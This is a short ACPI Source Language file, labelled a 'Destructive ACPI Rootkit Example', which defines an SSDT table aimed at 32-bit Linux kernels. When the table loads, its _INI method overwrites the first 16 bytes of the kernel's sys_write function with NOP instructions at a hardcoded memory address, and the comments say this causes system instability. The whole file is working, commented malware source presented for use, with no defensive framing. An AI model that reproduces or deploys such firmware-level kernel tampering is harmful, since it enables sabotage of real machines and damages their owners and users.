/*
 * Destructive ACPI Rootkit Example (SSDT)
 * Target: 32-bit Linux Kernel (e.g., Ubuntu 12.04)
 * Action: Overwrites sys_write with NOPs, causing system instability.
 */
DefinitionBlock ("SSDT", "SSDT", 1, "OEMID", "TABLEID", 0x00000001)
{
    // OpRegion pointing to sys_write in kernel memory.
    OperationRegion (KMEM, SystemMemory, 0x01164B40, 0x80)
    Field (KMEM, AnyAcc, NoLock, Preserve)
    {
        SYSC,   128  // Represents the first 16 bytes of the function.
    }

    // When this ACPI table is loaded. This is our trigger.
    Method (_INI, 1, NotSerialized)
    {
        // Create a buffer containing 16 bytes of NOP (0x90) instructions.
        Name (NOPS, Buffer(0x10)
        {
            0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
            0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
        })

        // Store the NOPs into the system call's memory location,
        // effectively erasing its original instructions.
        Store (NOPS, SYSC)
    }
}

